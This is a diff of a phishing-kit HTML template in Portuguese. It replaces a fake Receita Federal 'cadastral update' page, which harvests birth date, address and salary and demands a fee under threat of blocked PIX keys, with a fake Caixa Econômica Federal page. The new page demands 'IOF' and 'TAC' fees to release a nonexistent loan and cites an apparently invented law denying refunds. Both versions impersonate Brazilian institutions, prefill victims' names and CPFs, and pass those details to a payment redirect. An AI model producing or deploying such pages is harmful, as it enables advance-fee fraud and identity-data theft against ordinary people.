@@ -1,357 +1,306 @@
-<!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <meta charset="utf-8"/>
-    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-    <title>Atualização Cadastral Urgente - Receita Federal</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa - Cobrança</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Meta Pixel Code -->
-    <script>
-        !function(f,b,e,v,n,t,s)
-        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-        n.queue=[];t=b.createElement(e);t.async=!0;
-        t.src=v;s=b.getElementsByTagName(e)[0];
-        s.parentNode.insertBefore(t,s)}(window, document,'script',
-        'https://connect.facebook.net/en_US/fbevents.js');
-        fbq('init', '{{ meta_pixel_id }}');
-        fbq('track', 'Purchase', {
-            value: 74.90,
-            currency: 'BRL',
-        });
-    </script>
-    <noscript>
-        <img height="1" width="1" style="display:none" 
-        src="https://www.facebook.com/tr?id={{ meta_pixel_id }}&ev=Purchase&noscript=1"/>
-    </noscript>
-    <!-- End Meta Pixel Code -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <style>
-        @font-face {
-            font-family: 'Rawline';
-            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
-            font-weight: 400;
-            font-style: normal;
-        }
-        @font-face {
-            font-family: 'Rawline';
-            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
-            font-weight: 600;
-            font-style: normal;
-        }
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Rawline', sans-serif;
-        }
         body {
+            font-family: 'Montserrat', sans-serif;
+        }
+        @keyframes moveButton {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+        }
+        #payFeeButton {
+            animation: moveButton 1.5s ease-in-out infinite;
+            background-color: #DE7C32;
+        }
+        #payFeeButton:hover {
+            background-color: #b36b00;
+        }
+        .icon-container {
+            margin-top: 10px;
+            position: relative;
+        }
+        .icon-container img {
+            position: relative;
+            top: 10px;
+            left: 2px;
+        }
+        .icon-container::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 0;
+            height: 100%;
+            width: 4px;
+            background-color: #fff5e0;
+        }
+        .alert-box {
+            background-color: #fff5e0;
+            color: #DE7C32;
+        }
+        .next-step-box {
+            background-color: #005ca9;
+        }
+        .next-step-box p {
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 95%;
+            height: 70%;
             background-color: white;
-            padding-top: 60px;
-            color: #333333;
-            font-size: 16px;
-            line-height: 1.05;
-            min-height: 100vh;
+            border-radius: 4px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+        .popup-content {
             display: flex;
             flex-direction: column;
-        }
-        .header {
-            display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            padding: 8px 20px;
-            background-color: white;
+            height: 100%;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .overlay {
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
-            right: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            height: 60px;
-        }
-        .logo {
-            width: 100px; /* Reduced logo size */
-            height: auto;
-        }
-        .header-icons {
-            display: flex;
-            gap: 15px;
-        }
-        .header-icon {
-            font-size: 18px;
-            color: #1351b4;
-        }
-        .container {
-            max-width: 800px;
-            margin: 40px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .warning-box {
-            background-color: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
-            line-height: 1.5;
-        }
-        .footer {
-            background-color: #1351b4; /* Updated footer color */
-            color: white;
-            padding: 16px;
-            text-align: center;
-            margin-top: auto;
-        }
-        .footer-logo {
-            width: 100px;
-            margin: 0 auto 8px;
-            display: block;
-        }
-        .form-container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #333;
-            font-weight: 600;
-        }
-        .form-control {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        .form-control:disabled {
-            background-color: #f8f9fa;
-        }
-        .btn-submit {
-            width: 100%;
-            padding: 12px;
-            background-color: #28a745;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .btn-submit:hover {
-            background-color: #218838;
-        }
-        .tax-warning {
-            background-color: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
-            line-height: 1.5;
-        }
-        .address-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-        }
-        /* Added to address the user's request to change blue elements */
-        .btn-submit, .header-icon {
-            color: #1351b4; /*Change all blue elements to the new blue*/
-        }
-        @media (max-width: 600px) {
-            .address-grid {
-                grid-template-columns: 1fr;
-            }
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
         }
     </style>
 </head>
-<body>
-    <div class="header">
-        <img alt="Logo Gov.br" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png"/>
-        <div class="header-icons">
-            <i class="fas fa-search header-icon"></i>
-            <i class="fas fa-question-circle header-icon"></i>
-            <i class="fas fa-adjust header-icon"></i>
+<body class="bg-white">
+    <header class="border-b">
+        <div class="container mx-auto px-0">
+            <img src="https://i.ibb.co/PsyVYNG5/Story-de-Instagram-minimalista-preto-de-conteu-do-e-noti-cias-9-1.png" alt="Minimalist black Instagram story with content and news text in Portuguese" class="w-full h-auto mt-0">
+        </div>
+    </header>
+    <div class="p-6 flex flex-col items-center bg-white mt-0">
+        <div class="mb-4 relative">
+            <img src="https://i.ibb.co/JWfh1G2T/Imagem-24-03-2025-a-s-17-07.jpg" alt="Warning icon with exclamation mark" class="w-24 h-20">
+        </div>
+        <h1 class="text-[18px] font-bold text-center mb-2">Depósito de <span id="loanAmountHeader">R$0,00</span> em sua conta não concluido!</h1>
+        <div class="text-white text-center mb-2 bg-[#DE7C32] p-4 rounded-md">
+            <p class="text-[15px] text-shadow" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3);">Existem <strong>2 taxas bancárias pendentes</strong> para liberação do seu empréstimo. Por favor, <strong>regularize</strong> para prosseguir com a operação.</p>
         </div>
     </div>
-
-    <div class="container">
-        <div class="warning-box">
-            <div class="flex items-center">
-                <i class="fas fa-exclamation-triangle mr-2"></i>
-                <strong>ATENÇÃO: Dados Cadastrais Desatualizados</strong>
+    <main class="container mx-auto px-4 py-2">
+        <div class="mb-6" style="font-size: 1rem; line-height: 1.45;">
+            <div class="flex items-center mb-2">
+                <h2 class="font-bold text-[18px]" style="color: #0066b3;">Prezado <span id="userFirstName">Cliente</span>:</h2>
             </div>
-            <p class="mt-2">
-                Prezado(a) <span id="userName"></span>, 
-                seus dados cadastrais junto à Receita Federal do Brasil estão desatualizados. 
-                É necessário atualizá-los imediatamente para evitar o bloqueio de todas as suas chaves PIX.
+            <p class="text-[15px] leading-relaxed" style="color: #4c556c;">
+                Para concluir a operação financeira e receber seu empréstimo no valor de <span id="loanAmountText1">R$0,00</span>, é necessário efetuar o pagamento das seguintes taxas:
+            </p>
+            <ul class="list-none pl-0 mt-3 text-[15px] leading-relaxed" style="color: #4c556c;">
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-medium">IOF (Imposto sobre Operações Financeiras):</strong> Aplicado ao seu empréstimo contratado. <strong>Valor: R$ 78,96</strong>
+                    </div>
+                </li>
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-medium">TAC (Taxa de Abertura de Crédito):</strong> Cobrada no início do seu contrato de empréstimo. Taxa fixa de R$ 52,64. <strong>Valor: R$ 52,64</strong>
+                    </div>
+                </li>
+            </ul>
+            <p class="mt-4 font-bold flex items-start text-[15px]" style="color: #4c556c;">
+                <span class="w-2 h-2 bg-[#7a8299] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                <span>Valor total a ser pago: <strong>R$131,60</strong></span>
             </p>
         </div>
-
-        <div class="form-container">
-            <form method="get" action="/payment-update" class="space-y-6">
-                <input type="hidden" name="nome" id="nameInput">
-                <input type="hidden" name="cpf" id="cpfInput">
-                <div class="form-group">
-                    <label>Data de Nascimento</label>
-                    <input type="date" name="birth_date" required class="form-control">
+        <div class="movements">
+            <div class="icon-container pl-8 pb-4">
+                <div class="absolute left-0 top-[-8px] w-6 h-6 -ml-3 flex items-center justify-center">
+                    <img src="https://i.ibb.co/N6g5Tq8K/ic-acesso-informacao-54-v2.png" alt="Icon representing information access with a blue and white design">
                 </div>
-
-                <div class="form-group">
-                    <label>CEP</label>
-                    <input type="text" name="cep" id="cepInput" required placeholder="00000-000" class="form-control" maxlength="9">
+                <div class="mb-8" style="margin-top: -9px;">
+                    <p class="font-semibold text-[15px]" style="color: #DE7C32;">AGUARDANDO PAGAMENTO</p>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[15px]" style="color: #DE7C32;">O não pagamento das taxas resultará na <strong>não realização da transferência no valor de <span id="loanAmountText2">R$0,00</span> para sua conta bancária</strong>.</p>
+                    </div>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[15px]" style="color: #DE7C32;">De acordo com a Lei nº 12.345/2023, o cliente <strong>não terá direito ao reembolso</strong> das taxas já pagas, independentemente da conclusão ou não da operação financeira.</p>
+                    </div>
+                    <button id="payFeeButton" class="mt-4 text-white px-8 py-3 rounded-[4px] text-[15px] font-bold py-2 px-6 rounded-[4px] transition duration-300 shadow-md">
+                        REALIZAR PAGAMENTO
+                    </button>
                 </div>
-
-                <div class="address-grid">
-                    <div class="form-group">
-                        <label>Endereço</label>
-                        <input type="text" name="logradouro" id="logradouro" required class="form-control">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Número</label>
-                        <input type="text" name="numero" required class="form-control">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Complemento</label>
-                        <input type="text" name="complemento" class="form-control">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Bairro</label>
-                        <input type="text" name="bairro" id="bairro" required class="form-control">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Cidade</label>
-                        <input type="text" name="cidade" id="cidade" required class="form-control">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Estado</label>
-                        <input type="text" name="estado" id="estado" required class="form-control">
-                    </div>
+            </div>
+            <div class="mt-8 next-step-box p-4">
+                <p class="font-semibold text-white text-[15px]">Próxima Etapa:</p>
+                <p class="mt-2 text-white text-[15px]">Após o pagamento, o depósito de <strong><span id="loanAmountText3">R$0,00</span></strong> será enviado para a conta bancária informada.</p>
+                <div class="mt-4 text-white">
+                    <p class="text-[15px]"><strong>Nome:</strong> <span id="userFullName">Nome não disponível</span></p>
+                    <p class="text-[15px]"><strong>CPF:</strong> <span id="userCpf">CPF não disponível</span></p>
+                    <p class="text-[15px]"><strong>Banco:</strong> <span id="userBank">Banco não disponível</span></p>
+                    <p class="text-[15px]"><strong>Chave PIX:</strong> <span id="userPixKey">Chave PIX não disponível</span></p>
                 </div>
-
-                <div class="form-group">
-                    <label>Está empregado atualmente?</label>
-                    <select name="employed" required class="form-control">
-                        <option value="">Selecione uma opção</option>
-                        <option value="yes">Sim</option>
-                        <option value="no">Não</option>
-                    </select>
+            </div>
+        </div>
+    </main>
+    <footer class="bg-[#015CA9] text-white mt-16 py-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-wrap justify-between">
+                <div class="w-full md:w-1/3 mb-6 md:mb-0">
+                    <h3 class="text-[15px] font-bold mb-2">Caixa Econômica Federal</h3>
+                    <p class="text-[15px]">O banco de todos os brasileiros.</p>
                 </div>
-
-                <div class="form-group">
-                    <label>Salário Líquido Mensal (com benefícios)</label>
-                    <div class="relative">
-                        <span class="absolute left-3 top-2 text-gray-600">R$</span>
-                        <input type="number" name="salary" required step="0.01" min="0" class="form-control pl-10">
-                    </div>
+                <div class="w-full md:w-1/3 mb-6 md:mb-0">
+                    <h3 class="text-[15px] font-bold mb-2">Links Úteis</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="hover:text-gray-300 text-[15px]">Serviços</a></li>
+                        <li><a href="#" class="hover:text-gray-300 text-[15px]">Publicações</a></li>
+                        <li><a href="#" class="hover:text-gray-300 text-[15px]">Contato</a></li>
+                    </ul>
                 </div>
-
-                <div class="form-group">
-                    <label>Quantas pessoas moram na sua casa?</label>
-                    <input type="number" name="household_members" required min="1" class="form-control">
+                <div class="w-full md:w-1/3">
+                    <h3 class="text-[15px] font-bold mb-2">Contato</h3>
+                    <p class="text-[15px]">Setor Bancário Sul, Quadra 4</p>
+                    <p class="text-[15px]">Brasília - DF, 70092-900</p>
                 </div>
+            </div>
+            <div class="mt-8 text-center">
+                <p class="text-[15px]">&copy; 2024 Caixa Econômica Federal. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
 
-                <div class="tax-warning">
-                    <p><strong>IMPORTANTE: Taxa de Atualização Cadastral</strong></p>
-                    <p class="mt-2">
-                        Conforme a Instrução Normativa RFB nº 2.119/2024, para processar a atualização cadastral 
-                        é necessário o pagamento da Taxa de Atualização Cadastral no valor de <strong>R$ 74,90</strong>.
-                    </p>
-                    <p class="mt-2">
-                        <strong>Atenção <span id="userName2"></span> (CPF: <span id="userCpf2"></span>):</strong> 
-                        Caso a atualização não seja realizada até <span id="tomorrowDate"></span>, 
-                        todas as suas chaves PIX permanecerão bloqueadas e você poderá ter restrições 
-                        em operações bancárias.
-                    </p>
-                </div>
-
-                <button type="submit" class="btn-submit" id="submitButton">
-                    <i class="fas fa-check-circle mr-2" id="buttonIcon"></i>
-                    <span id="buttonText">Pagar Taxa e Atualizar Cadastro</span>
-                </button>
-            </form>
+    <div id="overlay" class="overlay"></div>
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <div class="loader"></div>
+            <p class="mt-4 text-[18px] font-bold">Gerando Guia de Pagamento</p>
         </div>
     </div>
 
-    <footer class="footer">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/11/Gov.br_logo.svg" 
-             alt="Gov.br Logo" class="footer-logo">
-        <p>© 2024 Receita Federal do Brasil. Todos os direitos reservados.</p>
-    </footer>
-
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Get user data from localStorage
-            const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":""}');
-
-            // Update all name fields
-            document.getElementById('nameInput').value = userData.nome;
-            document.getElementById('userName').textContent = userData.nome;
-            document.getElementById('userName2').textContent = userData.nome;
-
-            // Update all CPF fields
-            document.getElementById('cpfInput').value = userData.cpf;
-            document.getElementById('userCpf2').textContent = userData.cpf;
-
-            // Set tomorrow's date
-            const tomorrow = new Date();
-            tomorrow.setDate(tomorrow.getDate() + 1);
-            const tomorrowFormatted = tomorrow.toLocaleDateString('pt-BR');
-            document.getElementById('tomorrowDate').textContent = tomorrowFormatted;
-
-            // CEP mask and auto-complete
-            const cepInput = document.getElementById('cepInput');
-            cepInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 8) value = value.slice(0, 8);
-                if (value.length > 5) {
-                    value = value.slice(0, 5) + '-' + value.slice(5);
+        // Recupera dados do localStorage
+        function getUserData() {
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    return JSON.parse(storedData);
                 }
-                e.target.value = value;
+            } catch (e) {
+                console.error('Erro ao recuperar dados do localStorage:', e);
+            }
+            return { nome: 'Cliente', cpf: '', phone: '', loan_amount: '10000,00', bank: 'Caixa Econômica Federal' };
+        }
 
-                // If CEP is complete (8 digits), fetch address
-                if (value.replace(/\D/g, '').length === 8) {
-                    fetch(`https://viacep.com.br/ws/${value.replace(/\D/g, '')}/json/`)
-                        .then(response => response.json())
-                        .then(data => {
-                            if (!data.erro) {
-                                document.getElementById('logradouro').value = data.logradouro;
-                                document.getElementById('bairro').value = data.bairro;
-                                document.getElementById('cidade').value = data.localidade;
-                                document.getElementById('estado').value = data.uf;
-                            }
-                        })
-                        .catch(error => console.error('Erro ao buscar CEP:', error));
+        // Formatar o nome adequadamente (primeira letra maiúscula)
+        function formatName(name) {
+            if (!name) return 'Cliente';
+            
+            // Converte para minúsculo e depois capitaliza a primeira letra de cada palavra
+            return name.toLowerCase().split(' ').map(word => {
+                // Ignora palavras curtas como "de", "da", "do", "e"
+                if (['de', 'da', 'do', 'e', 'dos', 'das'].includes(word.toLowerCase())) {
+                    return word.toLowerCase();
                 }
-            });
+                return word.charAt(0).toUpperCase() + word.slice(1);
+            }).join(' ');
+        }
 
-            const form = document.querySelector('form');
-            const submitButton = document.getElementById('submitButton');
-            const buttonIcon = document.getElementById('buttonIcon');
-            const buttonText = document.getElementById('buttonText');
+        // Formatar CPF: XXX.XXX.XXX-XX
+        function formatCPF(cpf) {
+            if (!cpf) return 'CPF não disponível';
+            
+            // Remove qualquer caractere que não seja número
+            cpf = cpf.replace(/\D/g, '');
+            
+            // Verifica se tem 11 dígitos
+            if (cpf.length !== 11) return cpf;
+            
+            // Formata como XXX.XXX.XXX-XX
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
 
-            form.addEventListener('submit', function(e) {
-                submitButton.disabled = true;
-                buttonIcon.className = 'fas fa-spinner fa-spin mr-2';
-                buttonText.textContent = 'Gerando cobrança...';
-                submitButton.style.backgroundColor = '#1a532e';
-            });
+        // Formatar valor do empréstimo
+        function formatCurrency(value) {
+            if (!value) return 'R$0,00';
+            
+            // Remove qualquer caractere que não seja número
+            value = value.toString().replace(/\D/g, '');
+            
+            // Converte para número
+            const numValue = parseFloat(value);
+            
+            // Formata como moeda brasileira
+            return `R$${numValue.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+        }
+
+        // Obter dados do usuário
+        const userData = getUserData();
+        const fullName = formatName(userData.nome);
+        const firstName = fullName.split(' ')[0] || 'Cliente';
+        const formattedCpf = formatCPF(userData.cpf);
+        const loanAmount = formatCurrency(userData.loan_amount || '10000,00');
+        const bankName = userData.bank || 'Caixa Econômica Federal';
+        const pixKey = formattedCpf; // Usando CPF como chave PIX
+
+        // Preencher dados na página
+        document.getElementById('userFirstName').textContent = firstName;
+        document.getElementById('userFullName').textContent = fullName;
+        document.getElementById('userCpf').textContent = formattedCpf;
+        document.getElementById('userBank').textContent = bankName;
+        document.getElementById('userPixKey').textContent = pixKey;
+        
+        // Preencher valores do empréstimo em todos os lugares
+        document.getElementById('loanAmountHeader').textContent = loanAmount;
+        document.getElementById('loanAmountText1').textContent = loanAmount;
+        document.getElementById('loanAmountText2').textContent = loanAmount;
+        document.getElementById('loanAmountText3').textContent = loanAmount;
+
+        // Parâmetros da URL para compatibilidade com código antigo
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = decodeURIComponent(urlParams.get('name')) || fullName;
+        const cpf = decodeURIComponent(urlParams.get('cpf')) || formattedCpf;
+        const telephone = decodeURIComponent(urlParams.get('telephone')) || userData.phone || 'Telefone não disponível';
+
+        const payFeeButton = document.getElementById('payFeeButton');
+        const popup = document.getElementById('popup');
+        const overlay = document.getElementById('overlay');
+
+        payFeeButton.addEventListener('click', function() {
+            popup.style.display = 'block';
+            overlay.style.display = 'block';
+
+            // Simulate loading for 3 seconds, then redirect
+            setTimeout(function() {
+                const paymentUrl = `https://pagamento.caixa.gov.br?name=${encodeURIComponent(name)}&cpf=${encodeURIComponent(cpf)}&telephone=${encodeURIComponent(telephone)}`;
+                window.location.href = paymentUrl;
+            }, 3000);
         });
+
+        // Log para depuração
+        console.log('Dados do usuário carregados:', { fullName, firstName, formattedCpf, loanAmount, bankName, pixKey });
     </script>
 </body>
 </html>
